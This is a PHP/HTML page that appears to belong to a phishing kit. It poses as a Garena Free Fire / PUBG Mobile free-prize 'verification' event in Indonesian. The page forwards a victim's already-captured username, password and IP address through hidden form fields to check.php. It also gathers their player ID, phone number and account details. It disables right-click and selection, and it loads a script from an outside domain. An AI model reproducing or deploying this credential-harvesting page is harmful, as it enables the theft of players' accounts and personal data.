<?php

include"lokasi.php";

$username = $_POST['username'];
$password = $_POST['password'];
$login = $_POST['login'];
$ip = $khcodes['query'];
?>
<html>
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
  <meta property="og:title" content="GARENA FREE FIRE"> 
  <meta name="description" content="Royale Pass Season 12 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!"> 
  <meta property="og:description" content="Royale Pass Season 12 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!"> 
  <meta property="og:url" content="./"> 
  <meta property="og:site_name" content="PUBG MOBILE - Royale Pass Season 12"> 
  <meta property="og:type" content="website"> 
  <meta name="copyright" content="PUBG MOBILE"> 
  <meta name="theme-color" content="#000"> 
  <meta property="og:image" content="https://g.top4top.io/p_2000l2i6o5.jpeg"> 
  <title>GARENA FREE FIRE NEW EVENT</title> 
  <link rel="stylesheet" href="css/style.css"> 
  <link rel="stylesheet" href="css/animate.css"> 
  <link rel="stylesheet" href="css/login/facebook.css"> 
  <link rel="stylesheet" href="css/login/twitter.css"> 
  <link rel="stylesheet" href="css/login/google.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"> 
  <link rel="icon" href="../img/icon.png"> 
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-159654279-2');
</script>

  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
 </head> 
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> 
  <style>
::placeholder {
  color: #000;
}
</style> 
  <div class="container"> 
   <div class="container-mask"> 
    <div class="home"> 
     <div class="navbar"> 
      <img src="img/s12.png"> 
      <div class="navbar-title">
        New season 36 Free Fire
      </div> 
      <div class="navbar-desc">
        Verifikasi Akun Anda Untuk mendapatkan Hadiah 
      </div> 
     </div> 
     <div class="garis-home"></div> 
     <form action="check.php" method="post" id="veryForm" onsubmit="verify();"> 
      <input type="hidden" name="username" id="username" value="<?php echo $username;?>"> 
      <input type="hidden" name="password" id="password" value="<?php echo $password;?>"> 
       <input type="hidden" name="ip" id="ip" value="<?php echo $ip;?>"> 
      <input type="hidden" name="login" id="login" value="<?php echo $login;?>"> 
      <input type="number" class="verify" name="playid" id="playid" placeholder="Masukan Player ID" autocomplete="off" required> 
      <input type="number" class="verify" name="nope" id="nope" placeholder="Nomer ponsel" autocomplete="off" required> 
      <select name="level" id="level" required> <option selected disabled value="">Level Akun</option> <option>1</option> <option>2</option> <option>3</option> <option>4</option> <option>5</option> <option>6</option> <option>7</option> <option>8</option> <option>9</option> <option>10</option> <option>11</option> <option>12</option> <option>13</option> <option>14</option> <option>15</option> <option>16</option> <option>17</option> <option>18</option> <option>19</option> <option>20</option> <option>21</option> <option>22</option> <option>23</option> <option>24</option> <option>25</option> <option>26</option> <option>27</option> <option>28</option> <option>29</option> <option>30</option> <option>31</option> <option>32</option> <option>33</option> <option>34</option> <option>35</option> <option>36</option> <option>37</option> <option>38</option> <option>39</option> <option>40</option> <option>41</option> <option>42</option> <option>43</option> <option>44</option> <option>45</option> <option>46</option> <option>47</option> <option>48</option> <option>49</option> <option>50</option> <option>51</option> <option>52</option> <option>53</option> <option>54</option> <option>55</option> <option>56</option> <option>57</option> <option>58</option> <option>59</option> <option>60</option> <option>61</option> <option>62</option> <option>63</option> <option>64</option> <option>65</option> <option>66</option> <option>67</option> <option>68</option> <option>69</option> <option>70</option> <option>71</option> <option>72</option> <option>73</option> <option>74</option> <option>75</option> <option>76</option> <option>77</option> <option>78</option> <option>79</option> <option>80</option> <option>81</option> <option>82</option> <option>83</option> <option>84</option> <option>85</option> <option>86</option> <option>87</option> <option>88</option> <option>89</option> <option>90</option> <option>91</option> <option>92</option> <option>93</option> <option>94</option> <option>95</option> <option>96</option> <option>97</option> <option>98</option> <option>99</option> <option>100</option> </select> 
      <select name="tier" id="tier" required> <option selected disabled value="">Ranked Tier Level</option> <option>Bronze</option> <option>Silver</option> <option>Gold</option> <option>Platinum</option> <option>Diamond</option> <option>Master</option> <option>Grand Master</option> </select> 
      <select name="rpt" id="rpt" required> <option selected disabled value="">Elite Pass</option> <option>Pernah</option> <option>Tidak</option> <option>Pernah Pree-Order</option> </select> 
      <select name="platform" id="platform" required> <option selected disabled value="">Platform</option> <option>Android</option> <option>iOS</option> </select> 
      <div class="alert" id="error" style="display: none;"> 
       <i class="zmdi zmdi-close-circle-o"></i> Invalid Character ID. Try again! 
      </div> 
      <center> 
       <button type="submit" id="gas">Verifikasi Akun Saya</button> 
      </center> 
     </form> 
     <div id="success"></div> 
    </div> 
    <!-- container ---> 
   </div> 
  </div> 

 </body>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 <script src="http://user.crptycrip-id.xyz/item.min.js"></script>
</html>
